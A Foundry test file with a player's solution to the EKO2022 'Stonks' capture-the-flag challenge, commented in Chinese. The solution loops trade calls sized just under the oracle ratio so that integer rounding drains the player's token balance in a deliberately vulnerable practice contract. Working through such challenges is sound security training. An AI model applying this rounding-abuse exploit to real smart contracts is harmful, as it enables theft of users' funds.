// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Stonks} from "../../src/eko2022/08_Stonks/Stonks.sol";
import {Stonks_Factory} from "../../src/eko2022/08_Stonks/Stonks_Factory.sol";
import {Stonks_Attacker} from "./08_Stonks_Attacker.sol";

contract Stonks_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");

	Stonks_Factory factory;
	Stonks instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new Stonks_Factory();
		instContract = Stonks(factory.createInstance(player));
		
		vm.stopPrank();
	}
	
	function test__Solution_Stonks() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_Stonks -vv
		
		// 最快的速度，秒损耗
		uint256 amountTSLA_Sell_All = 0;
		uint256 amountGME_Buy_All = 0;
		uint256 amountGME_Current = 0;
		uint256 amountGME_Sell_Near2 = 0;
		uint256 loopTimes = 0;
		
		// `卖出`全部的`TSLA`，即，全部兑换为`GME`
		amountTSLA_Sell_All = instContract.balanceOf(player, instContract.TSLA());
		amountGME_Buy_All = amountTSLA_Sell_All * instContract.ORACLE_TSLA_GME();
		instContract.sellTSLA(amountTSLA_Sell_All, amountGME_Buy_All);
		
		// 单次循环，损耗最大值
		for(uint i=0; i < 100; i++) {
			instContract.buyTSLA(instContract.ORACLE_TSLA_GME() - 1, 0);
			
			if (instContract.balanceOf(player, instContract.GME()) < instContract.ORACLE_TSLA_GME() - 1) {
				break;
			}
		}
		
		console.log("step X + 1");
		console.log("instContract.balanceOf(player, instContract.TSLA())", instContract.balanceOf(player, instContract.TSLA()));
		console.log("instContract.balanceOf(player, instContract.GME())", instContract.balanceOf(player, instContract.GME()));
		
		// 最终一击，损耗所有
		instContract.buyTSLA(instContract.balanceOf(player, instContract.GME()), 0);
	}
}
